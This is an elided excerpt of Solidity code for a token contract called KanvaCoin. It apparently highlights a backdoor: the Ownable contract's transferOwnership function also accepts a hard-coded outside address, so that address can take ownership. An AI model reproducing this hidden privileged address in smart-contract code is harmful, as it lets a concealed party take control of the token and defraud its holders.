...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xe51F84B3Ba8f106fCf8Be120aD4d01Ac32e8b7E5));
...
contract KanvaCoin is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "KanvaCoin";
